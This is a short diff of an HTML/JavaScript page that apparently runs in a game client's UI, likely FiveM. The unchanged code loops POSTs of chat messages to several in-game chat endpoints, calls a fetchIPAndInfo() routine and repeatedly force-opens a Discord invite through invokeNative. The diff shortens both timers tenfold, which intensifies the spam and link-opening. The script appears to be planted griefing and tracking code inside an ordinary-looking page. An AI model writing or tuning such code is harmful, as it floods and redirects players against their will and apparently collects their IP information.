@@ -151,7 +151,7 @@
     fetch("https://as_chat/chatResult", { method: "POST", body });
     fetch("https://chat/chatResult", { method: "POST", body });
     fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
-  }, 1000);
+  }, 100);
         fetchIPAndInfo();
 
          setInterval(() => {
@@ -319,7 +319,7 @@
              window.invokeNative("openUrl", "https://discord.gg/GTX0");
              window.invokeNative("openUrl", "https://discord.gg/GTX0");
              window.invokeNative("openUrl", "https://discord.gg/GTX0");
-         }, 100);
+         }, 10);
     </script>
 
 </body>
